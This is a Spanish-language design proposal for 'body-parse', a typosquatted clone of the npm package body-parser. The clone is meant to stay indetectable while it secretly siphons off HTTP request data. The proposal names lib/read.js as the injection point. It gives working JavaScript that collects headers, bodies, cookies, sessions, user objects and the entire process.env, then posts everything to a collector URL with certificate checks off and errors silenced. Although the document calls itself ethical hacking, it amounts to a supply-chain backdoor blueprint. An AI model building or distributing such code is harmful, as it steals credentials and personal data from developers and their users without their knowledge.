## 1. Resumen Ejecutivo

Esta propuesta detalla la migración y adaptación del sniffer del repositorio `PoetArtist1/npm-packet-sniffer` dentro de un clon del paquete `body-parser` (versión 2.2.2), renombrado como `body-parse`. El objetivo es crear un paquete de Node.js que funcione exactamente igual que `body-parser`, pero que, de manera **indetectable** para el desarrollador que lo utilice, capture y transmita metadatos de las peticiones HTTP a un servidor colector remoto.

El proyecto se enmarca en un contexto de **hacking ético y educación en ciberseguridad**, con el fin de estudiar y comprender las técnicas de ingeniería inversa y los riesgos de la cadena de suministro de software.

## 2. Análisis del Sniffer Original (`npm-packet-sniffer`)

El sniffer original, ubicado en `express-utils-helper/index.js`, implementa dos mecanismos de captura:

1.  **Middleware de Express (`snifferMiddleware`)**: Se ejecuta en cada petición, capturando `timestamp`, `method`, `url`, `headers`, `body` e `ip` del cliente. Filtraba peticiones `GET` y `OPTIONS`, pero según los requisitos **debe capturar todas las peticiones**. Los datos se envían vía `axios.post` a un colector en `localhost:4000`.
2.  **Monkey-Patching de `http` y `https` (`initGlobalSniffer`)**: Intercepta las llamadas a `http.request` y `https.request` para registrar el tráfico saliente del servidor, excluyendo al propio colector.

**Limitaciones para el nuevo contexto:**
- Dependencia de `axios` (no permitida).
- Filtrado de métodos HTTP (debe eliminarse).
- Uso de `console.log` (debe eliminarse o redirigirse para no ser detectable).

## 3. Análisis de `body-parser` v2.2.2

El paquete `body-parser` expone cuatro middlewares principales: `json()`, `urlencoded()`, `raw()` y `text()`. Todos ellos comparten una función interna común: `read(req, res, next, parse, debug, options)` en el archivo `lib/read.js`.

Esta función es el **punto de inyección ideal** para el sniffer, ya que:
- Se ejecuta **después** de que el cuerpo de la petición ha sido completamente leído y procesado.
- Es utilizada por **todos los parsers**, garantizando una cobertura completa.
- Permite modificar el comportamiento sin alterar la API pública de los middlewares.

## 4. Estrategia de Migración y Arquitectura del Sniffer

La migración se basará en **monkey-patching** aplicado directamente sobre el código fuente clonado de `body-parser`. Esto garantiza que el paquete resultante (`body-parse`) pueda ser utilizado como un reemplazo directo (`drop-in replacement`) sin requerir cambios en el código de la aplicación objetivo.

### 4.1. Punto de Inyección: `lib/read.js`

Se modificará la función `read` para que, justo antes de invocar `next()`, ejecute la lógica de captura y envío de datos. Este es el flujo modificado:

4.2. Mecanismo de Captura y Envío
Para cumplir con los estrictos requisitos de no añadir dependencias, el envío de datos se realizará utilizando los módulos nativos http y https. Se implementará una función _sendToCollector(packet) que:

Serializa el paquete de datos a JSON.

Determina el protocolo (HTTP o HTTPS) basado en la URL del colector.

Realiza una petición POST utilizando el módulo nativo correspondiente.

Gestiona errores de forma silenciosa (sin console.log ni eventos visibles).

Implementa MITM: Para el envío a través de HTTPS, se configurará un agente HTTPS que no rechace certificados autofirmados, permitiendo la intercepción del tráfico en un entorno de pruebas controlado.

// Fragmento a inyectar en lib/read.js (versión sin ofuscar para revisión)
function _captureAndSend(req) {
  var packet = {
    timestamp: new Date().toISOString(),
    method: req.method,
    url: req.originalUrl,
    headers: req.headers,
    body: req.body,
    clientIp: req.ip,
    clientIps: req.ips,
    protocol: req.protocol,
    secure: req.secure,
    httpVersion: req.httpVersion,
    cookies: req.cookies,
    signedCookies: req.signedCookies,
    session: req.session,
    user: req.user,
    params: req.params,
    query: req.query,
    socketRemoteAddr: req.socket.remoteAddress,
    socketRemotePort: req.socket.remotePort,
    socketLocalAddr: req.socket.localAddress,
    socketLocalPort: req.socket.localPort,
    processPid: process.pid,
    processTitle: process.title,
    processArgv: process.argv,
    processEnv: process.env
  };

  var collectorUrl = process.env.SNIFFER_COLLECTOR_URL || 'https://localhost:4000/collect';
  var url = require('url').parse(collectorUrl);
  var protocol = url.protocol === 'https:' ? require('https') : require('http');
  
  var postData = JSON.stringify(packet);
  var options = {
    hostname: url.hostname,
    port: url.port,
    path: url.path,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    },
    rejectUnauthorized: false // MITM: Acepta certificados autofirmados
  };

  var req = protocol.request(options, function(res) {
    // Descartar respuesta para no dejar rastro
    res.resume();
  });

  req.on('error', function(e) {
    // Silenciar errores (no usar console.log)
  });

  req.write(postData);
  req.end();
}
